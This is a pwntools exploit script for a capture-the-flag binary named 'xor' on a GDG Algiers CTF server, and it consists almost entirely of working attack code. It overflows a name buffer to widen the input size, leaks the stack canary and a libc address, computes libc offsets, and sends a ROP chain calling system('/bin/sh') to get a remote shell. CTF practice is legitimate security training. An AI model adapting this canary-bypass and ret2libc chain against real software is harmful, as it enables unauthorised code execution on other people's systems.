from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './xor'
HOST = 'pwn.chal.ctf.gdgalgiers.com'
PORT =  1400

elf = ELF(TARGET)
def start():
	if not args.R:
		print("local")
		return process(TARGET)
		# return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
		# return process(TARGET, stdout=process.PTY, stdin=process.PTY)
	else:
		print("remote")
		return remote(HOST, PORT)

def get_base_address(proc):
	lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
	for line in lines :
		if TARGET[2:] in line.split('/')[-1] :
			break
	return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
	script = "handle SIGALRM ignore\n"
	PIE = get_base_address(proc)
	script += "set $base = 0x{:x}\n".format(PIE)
	for bp in breakpoints:
		script += "b *0x%x\n"%(PIE+bp)
	script += "c"
	gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))

r = start()
if args.D:
	debug(r, [])

# skip input_size and input size to 0x100
r.sendafter(b'name: ', b'y'*152+b'\x00\x01')

r.sendafter(b'Choice: ', b'4')
leak = r.recv(0x108)
canary = u64(leak[0x60:0x68])
lib_leak = u64(leak[0x90:0x98])
dbg('canary')
dbg('lib_leak')
base = lib_leak -0x29d90
system = base + 0x50d60
rdi = base + 0x001bc021
binsh = base + 0x1d8698
payload = b''
payload += b'a'*0x58
payload += flat(canary, 0, rdi+1, rdi, binsh, system)
r.sendafter(b'Choice: ', b'1')
r.sendafter(b': ', payload)
r.sendafter(b'Choice: ', b'0')

r.interactive()
r.close()
